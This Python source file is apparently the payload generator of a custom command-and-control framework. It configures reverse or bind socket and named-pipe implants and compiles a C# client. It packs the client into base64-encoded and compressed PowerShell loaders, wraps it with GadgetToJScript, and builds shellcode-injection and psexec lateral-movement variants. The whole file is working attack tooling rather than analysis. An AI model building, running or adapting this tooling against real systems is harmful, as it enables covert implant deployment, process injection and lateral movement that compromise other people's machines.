import os
import subprocess

class mypayloadgen():
    def __init__(self):
        self.__toCS = "Client\\myclient\\"
        self.__filenameCS = "Program.cs"
        self.__initstring1_tag = r"%%INITSTRINGONE%%"
        self.__initstring2_tag = r"%%INITSTRINGTWO%%"
        self.__startpayload_tag = r"%%STARTPAYLOAD%%"
        self.__initstring_setipstring = "t_app.ipstring = \"{}\";"
        self.__initstring_setnamepipehost = "t_app.namepipehost = \"{}\";"
        self.__initstring_setnamepipestring = "t_app.namepipestring = \"{}\";"
        self.__initstartclient = "t_app.StartClient();"
        self.__initstartserver = "t_app.StartServer();"
        self.__initstartpipserver = "t_app.StartPipServer();"
        self.__initstartpipclient = "t_app.StartPipeClinet();"


        self.__to_client = "Client\\"
        self.__to_template = "Client\\payload\\template\\"
        self.__payload_pstemplate = "Invoke-myclient.ps1"
        self.__psexec_pstemplate = "Invoke-psexec.ps1"
        self.__inject_pstemplate = "Invoke-inject.ps1"

        self.__parentdir = os.path.dirname(os.getcwd())
        self.__payload_tag = r"%%PAYLOAD%%"
        self.__to_payload = "Client\\payload\\"
        self.__to_tools = "Client\\tools\\"
        self.__to_psdb = "Server\\PSDB\\"
        self.__payload_outputname = "Invoke-myclient.ps1"
        self.__psexec_outputname = "Invoke-psexec.ps1"
        self.__inject_outputname = "Invoke-inject.ps1"

        self.__compress_file_tag = r"%%filename%%"
        self.__compress_template = "Invoke-Compression.ps1"
        self.__compress_topayload = "payload\\myclient.exe"
        self.__compress_topsexec = "tools\\csexec.exe"
        self.__compress_toinject = "tools\\Inject.exe"
        self.__compress_outputname = "Invoke-Compression.ps1"

        self.__base64_template = "Invoke-Base64.ps1"
        self.__base64_file_tag = r"%%filename%%"
        self.__base64_topayload = "payload\\myclient.exe"

        self.__gtojs_template = "GadgetToJScript.cs"
        self.__gtojs_toCS = "Client\\external\\GadgetToJScript\\"
        self.__gtojs_outputname = "GadgetToJScript.cs"
        self.__gtojs_payload_tag = r"%%PAYLOAD%%"




        self.__mystd = None

    def debug_mode(self,inbool):
        if inbool:
            self.__mystd = None
        else:
            self.__mystd = subprocess.DEVNULL


    def gen_gtojs(self):
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        #regen exe first
        subprocess.run(["build.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
        with open(os.path.join(self.__parentdir,self.__to_template,self.__base64_template),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__to_tools,self.__base64_template),mode='w') as f:
            f.write(all_of_it.replace(self.__base64_file_tag,self.__base64_topayload))
        
        output = subprocess.run(["b64gen.bat"], capture_output=True, shell=True, cwd=mycwd)
        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF

        with open(os.path.join(self.__parentdir,self.__to_template,self.__gtojs_template),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__gtojs_toCS,self.__gtojs_outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__gtojs_payload_tag,myb64))
        
        subprocess.run(["gtojs.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)


    def gen_ps1(self):
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        #regen exe first
        subprocess.run(["build.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)

        with open(os.path.join(self.__parentdir,self.__to_template,self.__compress_template),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__to_tools,self.__compress_template),mode='w') as f:
            f.write(all_of_it.replace(self.__compress_file_tag,self.__compress_topayload))

        output = subprocess.run(["psgen.bat"], capture_output=True, shell=True, cwd=mycwd)
        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF

        with open(os.path.join(self.__parentdir,self.__to_template,self.__payload_pstemplate),mode='r') as f:
            all_of_it = f.read()
        
        #print(all_of_it.replace(self.__payload_tag,myb64))
        with open(os.path.join(self.__parentdir,self.__to_payload,self.__payload_outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__payload_tag,myb64))

    def gen_exe(self):
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        subprocess.run(["build.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)


    def gen_inject(self):
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        #regen exe first
        subprocess.run(["build.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)

        #pre-compile config
        subprocess.run(["conf-inject.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #to shellcode
        subprocess.run(["inject.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #buid

        with open(os.path.join(self.__parentdir,self.__to_template,self.__compress_template),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__to_tools,self.__compress_template),mode='w') as f:
            f.write(all_of_it.replace(self.__compress_file_tag,self.__compress_toinject))

        output = subprocess.run(["psgen.bat"], capture_output=True, shell=True, cwd=mycwd)
        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF

        with open(os.path.join(self.__parentdir,self.__to_template,self.__inject_pstemplate),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__to_tools,self.__inject_outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__payload_tag,myb64))
        
        with open(os.path.join(self.__parentdir,self.__to_psdb,self.__inject_outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__payload_tag,myb64))


    def gen_psexec(self): #this will jump using current payload config, windows\temp need to be accessable
        
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        #regen exe first
        subprocess.run(["build.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)

        #pre-compile config
        subprocess.run(["conf-psexec.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
        subprocess.run(["psexec.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #buid

        with open(os.path.join(self.__parentdir,self.__to_template,self.__compress_template),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__to_tools,self.__compress_template),mode='w') as f:
            f.write(all_of_it.replace(self.__compress_file_tag,self.__compress_topsexec))

        output = subprocess.run(["psgen.bat"], capture_output=True, shell=True, cwd=mycwd)
        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF

        with open(os.path.join(self.__parentdir,self.__to_template,self.__psexec_pstemplate),mode='r') as f:
            all_of_it = f.read()
        
        with open(os.path.join(self.__parentdir,self.__to_tools,self.__psexec_outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__payload_tag,myb64))
        
        with open(os.path.join(self.__parentdir,self.__to_psdb,self.__psexec_outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__payload_tag,myb64))

        



    def set_config(self,typestr,reversestr,configstra,configstrb):

        #read cs
        with open(os.path.join(self.__parentdir,self.__to_template,self.__filenameCS),mode='r') as f:
            all_of_it = f.read()

        #print(os.path.join(self.__parentdir,self.__to_template,self.__filenameCS))
        #print(all_of_it)


        if typestr == "socket":
            #port and ip/host
            all_of_it = all_of_it.replace(self.__initstring1_tag,self.__initstring_setipstring.format("{}:{}".format(configstra,configstrb)))
            all_of_it = all_of_it.replace(self.__initstring2_tag,"")
            if reversestr == True:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartclient)
            else:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartserver)

        
        if typestr == "pipe":
            all_of_it = all_of_it.replace(self.__initstring1_tag,self.__initstring_setnamepipehost.format(configstra))
            all_of_it = all_of_it.replace(self.__initstring2_tag,self.__initstring_setnamepipestring.format(configstrb))
            if reversestr == True:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartpipclient)
            else:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartpipserver)


        #print(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS))
        #print(all_of_it)

        #write cs
        with open(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS),mode='w') as f:
            f.write(all_of_it)



if __name__ == "__main__":
    t_mypayloadgen = mypayloadgen()
    #t_mypayloadgen.set_config("socket",False,"127.0.0.1",4444)
    t_mypayloadgen.gen_gtojs()


